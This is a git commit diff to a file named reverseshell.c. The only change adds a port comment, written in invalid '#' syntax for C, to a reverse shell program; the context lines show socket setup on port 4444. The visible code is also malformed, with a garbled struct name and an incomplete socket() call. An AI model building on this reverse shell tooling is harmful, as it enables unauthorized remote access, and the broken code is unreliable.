e4042357b311d1e03eff07448e81bc7b6a43a9ac
Krisna Pranav <68631244+krishpranav@users.noreply.github.com>
2020-08-07 21:31:42 +0530

    Update reverseshell.c

--- reverseshell.c
+++ reverseshell.c
@@ -8,7 +8,7 @@
 int main(void) {
 
     int sockt;
-    int port = 4444;
+    int port = 4444; #you can define any port 
     struct sockaddr_in_revsockaddr;
 
     sockt = socket(AF_INET, SOCK_STREAM)
